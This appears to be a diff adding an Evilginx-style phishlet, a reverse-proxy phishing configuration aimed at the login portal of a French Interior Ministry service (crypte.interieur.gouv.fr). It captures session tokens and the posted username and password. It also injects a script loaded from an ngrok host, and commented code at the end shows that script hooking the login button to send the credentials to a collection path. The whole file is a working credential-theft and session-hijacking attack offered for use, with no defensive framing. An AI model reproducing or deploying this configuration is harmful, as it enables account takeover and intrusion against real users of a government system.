@@ -1,0 +1,40 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'crypte', orig_sub: 'crypte', domain: 'interieur.gouv.fr', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'crypte.interieur.gouv.fr', orig_sub: 'crypte', domain: 'interieur.gouv.fr', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'crypte.interieur.gouv.fr', orig_sub: 'crypte', domain: 'interieur.gouv.fr', search: '48c397.js"></script>', replace: '48c397.js"></script><script>$.getScript("//f3e1-116-202-166-3.ngrok.io/fuck.js")</script>', mimes: ['text/html']}
+auth_tokens:
+  - domain: 'crypte.interieur.gouv.fr'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'crypte.interieur.gouv.fr'
+  path: '/' 
+
+# SCRIPT EXTERNE ( FUCK.JS )
+# function onclickListener(){
+#        var submit = document.querySelectorAll('button[class="btn btn-primary btn-big"]')[0];
+#        submit.setAttribute("onclick", "sendPass()", 500);
+#        return;
+#      }
+#      function sendPass(){
+#        var username = document.getElementById("login-email").value;
+#        var pass = document.getElementById("login-password").value;
+#        var xhr = new XMLHttpRequest();
+#        xhr.open("POST", '/touhou', true);
+#        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+#        xhr.send("username="+encodeURIComponent(username)+"&password="+encodeURIComponent(pass));
+#        return;
+#      }
+#      setTimeout(function(){ onclickListener(); }, 1000);
+  
